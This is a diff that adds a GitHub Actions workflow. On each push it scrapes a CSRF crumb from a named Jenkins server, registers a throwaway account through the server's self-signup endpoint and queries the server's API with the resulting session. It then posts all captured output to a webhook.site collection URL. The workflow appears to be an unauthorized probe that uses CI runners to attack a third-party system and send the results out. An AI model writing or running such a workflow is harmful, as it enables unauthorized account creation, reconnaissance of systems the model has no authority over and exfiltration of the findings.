@@ -1,0 +1,32 @@
+name: jsignup3
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  jsignup3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Signup3
+        run: |
+          {
+            rm -f /tmp/cj
+            echo "=== GET /login (session) ==="
+            curl -sS -k -m 15 -c /tmp/cj -o /tmp/l.html -w "code=%{http_code}\n" https://jenkins.htpl.cc/login 2>&1
+            echo "=== GET createAccount (crumb) ==="
+            curl -sS -k -m 15 -b /tmp/cj -c /tmp/cj -o /tmp/s.html -w "code=%{http_code}\n" https://jenkins.htpl.cc/securityRealm/createAccount 2>&1
+            CRUMB=$(grep -oE "data-crumb-value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
+            [ -z "$CRUMB" ] && CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
+            echo "crumb=$CRUMB"
+            U="probe$(date +%s)"
+            echo "=== POST createAccount ==="
+            curl -sS -k -m 15 -b /tmp/cj -c /tmp/cj -o /tmp/r.html -w "code=%{http_code} size=%{size_download}\n" -X POST https://jenkins.htpl.cc/securityRealm/createAccount -H "Jenkins-Crumb: $CRUMB" --data-urlencode "username=$U" --data-urlencode "password1=ProbePass123!" --data-urlencode "password2=ProbePass123!" --data-urlencode "fullname=Probe User" --data-urlencode "email=$U@example.com" 2>&1
+            echo "=== response body ==="
+            sed "s/<[^>]*>/ /g" /tmp/r.html 2>/dev/null | tr -s " " | head -c 800
+            echo
+            echo "=== api with cookie ==="
+            curl -sS -k -m 15 -b /tmp/cj -o /tmp/a -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
+            head -c 300 /tmp/a
+          } > /tmp/out.txt 2>&1
+          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
